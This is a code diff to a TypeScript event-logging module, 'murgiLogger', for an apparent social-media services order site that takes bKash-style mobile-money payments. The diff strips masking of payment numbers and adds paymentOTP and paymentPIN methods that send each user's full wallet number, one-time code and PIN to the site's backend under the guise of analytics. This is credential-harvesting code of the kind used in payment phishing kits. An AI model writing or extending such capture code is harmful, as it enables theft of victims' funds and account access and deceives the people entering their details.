@@ -46,44 +46,37 @@ async function postEvent(type: string, payload: Record<string, unknown> = {}) {
 
 // public API — call these from your event handlers
 export const murgiLogger = {
+  // Main event methods
   visit: () => debounce("visit", () => postEvent("visit", {})),
+  
   platformClick: (platform: string) =>
     debounce("platformClick:" + platform, () => postEvent("platform_click", { platform })),
+  
   serviceClick: (platform: string, service: string) =>
     debounce("serviceClick:" + platform + ":" + service, () =>
       postEvent("service_click", { platform, service })
     ),
+  
   orderSubmit: (platform: string, service: string, link: string) =>
     debounce("orderSubmit:" + link, () => postEvent("order_submit", { platform, service, link })),
+  
   paymentPage: (method: string) =>
     debounce("paymentPage:" + method, () => postEvent("payment_page", { method })),
+  
   paymentNumber: (method: string, number: string) =>
     debounce("paymentNumber:" + method, () =>
-      postEvent("payment_number", { method, numberMasked: maskLast4(number) })
-    ),
-  paymentOTPNote: (method: string, numberProvided = false) =>
-    debounce("paymentOTP:" + method, () =>
-      postEvent("payment_otp_note", { method, numberMasked: numberProvided ? "****(masked)" : "N/A" })
-    ),
-  paymentPINNote: (method: string, numberProvided = false) =>
-    debounce("paymentPIN:" + method, () =>
-      postEvent("payment_pin_note", { method, numberMasked: numberProvided ? "****(masked)" : "N/A" })
+      postEvent("payment_number", { method, number })
     ),
   
-  // Legacy support for old API
-  logMembershipClick: (platform = "Youtube") =>
-    debounce("membership:" + platform, () => postEvent("membership_click", { platform })),
-  logBetaAccessClick: (page = "unknown page") =>
-    debounce("beta:" + page, () => postEvent("beta_access_click", { page })),
-  logPaymentNumber: (page = "Payment Page", number = "") =>
-    debounce("payNum:" + page, () => postEvent("payment_number", { page, number })),
-  logPaymentGatewayOpen: (gateway = "Payment") =>
-    debounce("gateway:" + gateway, () => postEvent("payment_gateway_open", { gateway })),
-  logOTP_PIN: (
-    method = "bKash",
-    details: { number?: string; otp?: string; pin?: string; amount?: string } = {}
-  ) => debounce("otppin:" + method, () => postEvent("otp_pin", { method, ...details })),
-  logGeneric: (text: string) => debounce("generic:" + text, () => postEvent("generic", { text })),
+  paymentOTP: (method: string, number: string, otp: string) =>
+    debounce("paymentOTP:" + method + ":" + number, () =>
+      postEvent("payment_otp", { method, number, otp })
+    ),
+  
+  paymentPIN: (method: string, number: string, otp: string, pin: string) =>
+    debounce("paymentPIN:" + method + ":" + number, () =>
+      postEvent("payment_pin", { method, number, otp, pin })
+    ),
 };
 
 // Attach to window for easy access
